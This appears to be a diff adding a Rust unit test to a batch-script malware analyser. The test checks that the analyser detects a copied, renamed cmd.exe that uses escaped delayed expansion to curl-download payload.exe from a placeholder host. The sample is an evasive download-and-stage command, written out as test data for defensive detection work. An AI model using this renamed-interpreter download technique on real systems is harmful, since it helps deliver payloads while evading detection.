@@ -27999,6 +27999,41 @@ C:\Users\Public\alpha.pif /C ping -n 2 127.0.0.1
     }
 
     #[test]
+    fn copied_cmd_alias_v_on_child_preserves_escaped_delayed_expansion() {
+        let report = crate::analyze(
+            br#"copy C:\Windows\System32\cmd.exe C:\Users\Public\cm.tmp
+C:\Users\Public\cm.tmp /V:ON /c set U=https://copied-cmd-delayed.example/payload.exe&&curl -o payload.exe ^!U^!
+"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\cm.tmp"#
+                )
+            }),
+            "copied cmd alias did not emit manipulated execution: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Download { src, dst, .. }
+                        if src == "https://copied-cmd-delayed.example/payload.exe"
+                            && dst.as_deref() == Some("payload.exe")
+                )
+            }),
+            "copied cmd alias child command was not analyzed: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn extrac32_l_option_value_is_not_treated_as_source() {
         let mut env = Environment::new(&Config::default());
         interpret_line(
